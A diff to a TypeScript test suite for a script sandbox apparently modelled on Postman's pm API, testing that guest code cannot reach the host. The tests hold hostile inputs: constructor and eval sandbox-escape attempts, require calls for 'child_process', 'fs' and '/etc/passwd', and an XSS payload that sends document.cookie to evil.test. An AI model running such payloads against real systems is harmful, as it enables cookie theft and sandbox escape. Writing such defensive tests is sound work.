@@ -9,8 +9,10 @@ async function probe(expression: string, options: Parameters<typeof makeInput>[1
   return JSON.parse(r.variables.variables.probe!);
 }
 
+// `require` and `Buffer` are deliberately NOT in this list: they are guest-side facades (allow-listed bundled libraries,
+// a pure-JS Buffer subset) with no host authority. They are covered by the allow-list test and tests/unit/scripting-libs.test.ts.
 const FORBIDDEN_GLOBALS = [
-  'require', 'process', 'std', 'os', 'fetch', 'XMLHttpRequest', 'WebAssembly', 'Buffer', 'module', 'exports', '__dirname', '__filename',
+  'process', 'std', 'os', 'fetch', 'XMLHttpRequest', 'WebAssembly', 'module', 'exports', '__dirname', '__filename',
   'global', 'window', 'self', 'document', 'navigator', 'Deno', 'Bun', 'electron', 'ipcRenderer', 'contextBridge', 'Worker', 'WebSocket',
   'setInterval', 'setImmediate', 'clearInterval', 'clearImmediate', 'localStorage', 'sessionStorage', 'indexedDB', 'crypto', 'performance',
   'structuredClone', 'importScripts', 'SharedWorker', 'MessageChannel', 'EventSource', 'Blob', 'FormData', 'Headers', 'Request', 'Response',
@@ -24,7 +26,7 @@ describe('sandbox: no ambient authority', () => {
   });
 
   it('typeof checks of bare identifiers are undefined', async () => {
-    const out = await probe(`[typeof require, typeof process, typeof std, typeof os, typeof fetch, typeof XMLHttpRequest, typeof WebAssembly, typeof Buffer, typeof module]`);
+    const out = await probe(`[typeof process, typeof std, typeof os, typeof fetch, typeof XMLHttpRequest, typeof WebAssembly, typeof module, typeof crypto, typeof global]`);
     expect(out).toEqual(Array(9).fill('undefined'));
   });
 
@@ -41,10 +43,41 @@ describe('sandbox: no ambient authority', () => {
       // Aegis additions (documented in docs/features/scripting.md)
       'pm', 'postman', 'tests', 'expect', 'console', 'setTimeout', 'clearTimeout', 'queueMicrotask', 'atob', 'btoa', 'TextEncoder', 'TextDecoder',
       'URL', 'URLSearchParams',
-      // throwing stubs for unsupported libraries
-      'CryptoJS', '_', 'moment', 'cheerio', 'tv4', 'xml2Json',
+      // lazily loaded bundled libraries / guest-side facades (see docs/features/scripting.md "Libraries")
+      'require', 'CryptoJS', '_', 'moment', 'tv4', 'xml2Json', 'Buffer',
+      // throwing stub for an unsupported library
+      'cheerio',
     ]);
     expect(names.filter((n) => !allowed.has(n))).toEqual([]);
+  });
+
+  it('loading every library adds no global names beyond the allow-list and nothing host-related', async () => {
+    const names = (await probe(`(() => {
+      const before = new Set(Object.getOwnPropertyNames(globalThis));
+      for (const m of ['lodash', 'moment', 'crypto-js', 'uuid', 'ajv', 'tv4', 'xml2js', 'chai', 'buffer', 'csv-parse/lib/sync']) require(m);
+      pm.visualizer.set('<b>{{a}}</b>', { a: 1 });
+      return Object.getOwnPropertyNames(globalThis).filter((n) => !before.has(n));
+    })()`)) as string[];
+    expect(names).toEqual([]);
+  });
+
+  it('bundled libraries cannot reach the host bridge or Node (they only receive a getRandomValues shim)', async () => {
+    const out = (await probe(`(() => {
+      const results = {};
+      const _ = require('lodash');
+      results.lodashRoot = typeof _.runInContext().VERSION; // lodash's root is the guest global
+      results.fnCtor = typeof _.constructor('return typeof host')();
+      results.fnCtorProcess = _.constructor('return typeof process')();
+      results.ajvNewFunction = (() => { const Ajv = require('ajv'); const v = new Ajv({ strict: false }).compile({ type: 'string' }); return typeof v.constructor('return typeof require')(); })();
+      results.hbRequire = (() => { try { pm.visualizer.set('{{lookup this "constructor"}}', {}); return 'rendered'; } catch (e) { return e.name; } })();
+      results.momentGlobal = typeof moment.fn.zone;
+      return results;
+    })()`)) as Record<string, string>;
+    expect(out.lodashRoot).toBe('string');
+    expect(out.fnCtor).toBe('string');
+    expect(out.fnCtorProcess).toBe('undefined');
+    expect(out.ajvNewFunction).toBe('string');
+    expect(out.hbRequire).toBe('rendered');
   });
 
   it('constructor / this / Function escapes do not reach the host', async () => {
@@ -52,13 +85,13 @@ describe('sandbox: no ambient authority', () => {
       const results = {};
       const attempt = (name, fn) => { try { results[name] = String(fn()); } catch (e) { results[name] = 'threw ' + e.name; } };
       attempt('ctorCtor', () => this.constructor.constructor('return typeof process')());
-      attempt('ctorCtorFn', () => (function () {}).constructor('return typeof require')());
+      attempt('ctorCtorFn', () => (function () {}).constructor('return typeof require("child_process")')());
       attempt('thisProcess', () => (function () { return typeof this.process; })());
       attempt('globalProcess', () => typeof (function () { return this; })().process);
-      attempt('FunctionRequire', () => typeof Function('return require')());
+      attempt('FunctionRequire', () => typeof Function('return require("fs")')());
       attempt('FunctionGlobal', () => Function('return globalThis')().process === undefined);
       attempt('evalProcess', () => eval('typeof process'));
-      attempt('indirectEval', () => (0, eval)('typeof require'));
+      attempt('indirectEval', () => (0, eval)('typeof process'));
       attempt('objectCtor', () => ({}).constructor.constructor('return typeof process')());
       attempt('arrayCtor', () => [].constructor.constructor('return typeof process')());
       attempt('promiseCtor', () => Promise.constructor('return typeof process')());
@@ -70,10 +103,10 @@ describe('sandbox: no ambient authority', () => {
       return results;
     })()`)) as Record<string, string>;
     expect(out.ctorCtor).toBe('undefined');
-    expect(out.ctorCtorFn).toBe('undefined');
+    expect(out.ctorCtorFn).toMatch(/threw Error/); // the guest require() rejects Node built-ins
     expect(out.thisProcess).toBe('undefined');
     expect(out.globalProcess).toBe('undefined');
-    expect(out.FunctionRequire).toMatch(/ReferenceError|threw/);
+    expect(out.FunctionRequire).toMatch(/threw Error/); // require('fs') throws MODULE_NOT_FOUND inside the guest
     expect(out.FunctionGlobal).toBe('true');
     expect(out.evalProcess).toBe('undefined');
     expect(out.indirectEval).toBe('undefined');
@@ -91,10 +124,79 @@ describe('sandbox: no ambient authority', () => {
     expect(r.ok).toBe(false);
   });
 
-  it('require() is a plain ReferenceError', async () => {
+  it('require() of Node built-ins and unknown modules throws (no file system, processes or network)', async () => {
     const r = await runScript(makeInput(`require('fs');`));
     expect(r.ok).toBe(false);
-    expect(r.error?.name).toBe('ReferenceError');
+    expect(r.error?.name).toBe('Error');
+    expect(r.error?.message).toContain("Cannot find module 'fs'");
+
+    const probe = await runScript(
+      makeInput(`
+        const out = {};
+        for (const m of ['fs', 'child_process', 'node:fs', 'net', 'http', 'https', 'os', 'path', 'util', 'vm', 'worker_threads', 'electron', 'crypto', 'node:crypto', 'cheerio', 'postman-collection', '../package.json', './x', '/etc/passwd', 'lodash/fp']) {
+          try { require(m); out[m] = 'loaded'; } catch (e) { out[m] = e.code || e.name; }
+        }
+        pm.variables.set('out', JSON.stringify(out));
+      `),
+    );
+    expectOk(probe);
+    const out = JSON.parse(probe.variables.variables.out!) as Record<string, string>;
+    for (const [name, value] of Object.entries(out)) expect(value, name).toMatch(/^(MODULE_NOT_FOUND|Error)$/);
+  });
+
+  it('pm.visualizer output is stripped of scripts, handlers and javascript: URLs before it leaves the sandbox', async () => {
+    const r = await runScript(
+      makeInput(
+        `pm.visualizer.set('<div onclick="steal()">{{{raw}}}<a href="javascript:alert(1)">x</a><img src=x onerror=alert(1)></div>', { raw: '<script>fetch("https://evil.test?" + document.cookie)</script><iframe src="https://evil.test"></iframe><p>ok</p>' });`,
+        { secretValues: ['sk_live_9f8e7d6c5b4a'] },
+      ),
+    );
+    expectOk(r);
+    const html = r.visualizer!;
+    expect(html).not.toMatch(/<script|<iframe|onclick|onerror|javascript:/i);
+    expect(html).toContain('<p>ok</p>');
+  });
+
+  it('pm.visualizer rejects templates and output larger than 2 MiB', async () => {
+    const r = await runScript(
+      makeInput(`
+        try { pm.visualizer.set('x'.repeat(2 * 1024 * 1024 + 1)); } catch (e) { pm.variables.set('tpl', e.name); }
+        try { pm.visualizer.set('{{{big}}}', { big: 'y'.repeat(2 * 1024 * 1024 + 1) }); } catch (e) { pm.variables.set('out', e.name); }
+      `),
+    );
+    expectOk(r);
+    expect(r.variables.variables).toEqual({ tpl: 'RangeError', out: 'RangeError' });
+    expect(r.visualizer).toBeUndefined();
+  });
+
+  it('cookie jar writes cannot set httpOnly cookies and operations are capped', async () => {
+    const ops: unknown[] = [];
+    const host = {
+      sendRequest: async () => {
+        throw new Error('unused');
+      },
+      cookieJar: async (op: unknown) => {
+        ops.push(op);
+        return { cookies: [] };
+      },
+    };
+    const r = await runScript(
+      makeInput(
+        `
+        const jar = pm.cookies.jar();
+        try { await jar.set('https://a.test', { name: 'sid', value: '1', httpOnly: true }); pm.variables.set('httpOnly', 'accepted'); } catch (e) { pm.variables.set('httpOnly', e.message); }
+        let rejected = 0;
+        for (let i = 0; i < 205; i++) { try { await jar.set('https://a.test', 'c' + i, 'v'); } catch (e) { rejected++; } }
+        pm.variables.set('rejected', String(rejected));
+        `,
+        { host },
+      ),
+    );
+    expectOk(r);
+    expect(r.variables.variables.httpOnly).toContain('httpOnly');
+    expect(ops).toHaveLength(200);
+    expect(r.variables.variables.rejected).toBe('5');
+    expect(JSON.stringify(ops)).not.toContain('httpOnly":true');
   });
 
   it('internal prelude objects and host bindings are not reachable from user code', async () => {
@@ -184,6 +286,35 @@ describe('sandbox: resource limits', () => {
       }),
     );
     expect(r.variables.variables.caught).toBe('InternalError:out of memory');
+  });
+
+  it('time and memory limits still hold with libraries loaded', async () => {
+    const cpu = await runScript(
+      makeInput(`const _ = require('lodash'); const m = require('moment'); CryptoJS.SHA256('x'); pm.environment.set('loaded', '1'); while (true) { _.range(10); m(); }`, {
+        limits: { timeoutMs: 400 },
+      }),
+    );
+    expect(cpu.error?.code).toBe('SCRIPT_TIMEOUT');
+    expect(cpu.variables.environment.loaded).toBe('1');
+
+    const memory = await runScript(
+      makeInput(`const _ = require('lodash'); require('ajv'); require('moment'); const a = []; while (true) a.push(_.range(1e5));`, {
+        limits: { memoryLimitBytes: 24 * 1024 * 1024, timeoutMs: 3000 },
+      }),
+    );
+    expect(memory.ok).toBe(false);
+    expect(['SCRIPT_MEMORY', 'SCRIPT_TIMEOUT']).toContain(memory.error?.code);
+
+    const hashBomb = await runScript(makeInput(`let s = 'x'; while (true) s += CryptoJS.SHA512(s).toString();`, { limits: { memoryLimitBytes: 8 * 1024 * 1024, timeoutMs: 3000 } }));
+    expect(hashBomb.ok).toBe(false);
+    expect(['SCRIPT_MEMORY', 'SCRIPT_TIMEOUT']).toContain(hashBomb.error?.code);
+
+    const tooSmall = await runScript(makeInput(`try { require('lodash'); pm.variables.set('r', 'loaded'); } catch (e) { pm.variables.set('r', e.name + ':' + e.message); }`, { limits: { memoryLimitBytes: 256 * 1024 } }));
+    expect(tooSmall.variables.variables.r ?? tooSmall.error?.code).toMatch(/could not be loaded|out of memory|SCRIPT_MEMORY|loaded/);
+
+    const next = await runScript(makeInput(`pm.variables.set('alive', require('lodash').VERSION)`));
+    expectOk(next);
+    expect(next.variables.variables.alive).toMatch(/^4\./);
   });
 
   it('deep recursion => SCRIPT_ERROR (stack overflow), not a host crash', async () => {
